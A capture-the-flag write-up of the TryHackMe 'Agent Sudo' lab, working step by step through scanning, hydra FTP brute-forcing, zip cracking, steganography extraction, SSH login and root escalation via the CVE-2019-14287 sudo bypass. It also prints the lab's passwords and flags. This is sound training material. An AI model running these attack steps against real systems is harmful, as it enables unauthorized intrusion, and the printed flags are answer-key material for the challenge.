# Agent Sudo

Laurent Chauvin | October 31, 2022

## Resources

[1] https://www.exploit-db.com/exploits/47502

## Progress

```
export IP=10.10.236.51
```

Running nmap scan:
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 15:14 EDT
Nmap scan report for 10.10.236.51
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.97 seconds
```

Run Gobuster scan:
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log 

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.236.51
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/31 15:16:35 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
```

Run Nikto scan:
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.236.51
+ Target Hostname:    10.10.236.51
+ Target Port:        80
+ Start Time:         2022-10-31 15:17:07 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2022-10-31 15:38:44 (GMT-4) (1297 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Webpage states:
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

Try to curl with different User-Agent:
```
curl -H "User-Agent: R" http://$IP

What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```

After testing different letters, got:
```
curl -H "User-Agent: C" -L http://$IP

Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

Bruteforcing FTP password for username 'chris':
```
hydra -l chris -P /opt/rockyou.txt ftp://$IP  
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-31 15:26:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.236.51:21/
[STATUS] 132.00 tries/min, 132 tries in 00:01h, 14344266 to do in 1811:09h, 16 active
[21][ftp] host: 10.10.236.51   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-31 15:28:14
```

Get into FTP and download files:
```
ftp $IP
Connected to 10.10.236.51.
220 (vsFTPd 3.0.3)
Name (10.10.236.51:kali): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16672|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget To_agentJ.txt cute-alien.jpg cutie.jpg
mget To_agentJ.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||62938|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |***********************************************************************************************************************************************************************************************|   217      106.59 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (1.30 KiB/s)
mget cute-alien.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||14406|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |***********************************************************************************************************************************************************************************************| 33143      130.17 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (80.87 KiB/s)
ftp> y
?Invalid command.
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||62371|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |***********************************************************************************************************************************************************************************************| 34842      105.60 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (71.19 KiB/s)
```

To_agentJ.txt:
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Checking image files:
```
file cutie.png 
cutie.png: PNG image data, 528 x 528, 8-bit colormap, non-interlaced
                                                                                                                                                                                                                                            
file cute-alien.jpg 
cute-alien.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 440x501, components 3
```
```
binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


binwalk cutie.png     

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

Cutie.png seems to contain a zip archive. Let's extract.

```
binwalk -e cutie.png
cd _cutie.png.extracted
ls

365  365.zlib  8702.zip  To_agentR.txt
```

```
cat To_agentR.txt
```

To_agentR.txt seems empty for now.

Unzipping archive:
```
unzip 8702.zip            
Archive:  8702.zip
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
```

Unzip doesn't seems to work. Let's try 7z:
```
7z x 8702.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD A8-6600K APU with Radeon(tm) HD Graphics    (610F31),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 08:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 08:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt
                    
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

Need password. Let's convert it for John.

```
zip2john 8702.zip > 8702_forJohn.txt
```

Let's run John:
```
john 8702_forJohn.txt --wordlist=/opt/rockyou.txt     

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE (2022-10-31 15:39) 0.5347g/s 13142p/s 13142c/s 13142C/s tracey1..280690
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Let's unzip now:
```
7z x 8702.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD A8-6600K APU with Radeon(tm) HD Graphics    (610F31),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 08:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 08:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```

Let's display To_agentR.txt:
```
cat To_agentR.txt

Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

String 'QXJlYTUx' seems to be base64:
```
echo "QXJlYTUx" | base64 -d

Area51 
```

It seems a message is hidden in the 'cute-alien.jpg':
```
steghide --extract -sf cute-alien.jpg

Enter passphrase: Area51
wrote extracted data to "message.txt".
```

Showing 'message.txt':
```
cat message.txt

Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We can now ssh as 'james':
```
ssh james@$IP                        
The authenticity of host '10.10.236.51 (10.10.236.51)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.236.51' (ED25519) to the list of known hosts.
james@10.10.236.51's password: hackerrules!
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Oct 31 19:52:19 UTC 2022

  System load:  0.0               Processes:           96
  Usage of /:   39.8% of 9.78GB   Users logged in:     0
  Memory usage: 37%               IP address for eth0: 10.10.236.51
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 
```

Let's find the user flag:
```
cat user_flag.txt 

b03d975e8c92a7c04146cfa7a5a313c7
```

Let's get the image in james home directory:
```
scp james@$IP:/home/james/Alien_autospy.jpg ~/ctf/thm/Agent_Sudo 

james@10.10.236.51's password: hackerrules!
Alien_autospy.jpg  
```

A picture of the 'Roswell Alien Autopsy'.

Time to privesc.

Let's check 'james' sudo privileges:
```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

When searching for '(ALL, !root) CVE' we found [1], which related to CVE-2019-14287.

From [1]:
```
hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id
```

Running ```sudo -u#-1 /bin/bash``` gives us:
```
root@agent-sudo:~# whoami
root
```

We are now root. Let's get the flag.
```
cat /root/root.txt

To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```


## Flag

1. User

```
b03d975e8c92a7c04146cfa7a5a313c7
```

2. Privesc

```
b53a02f55b57d4439e3341834d70c062
```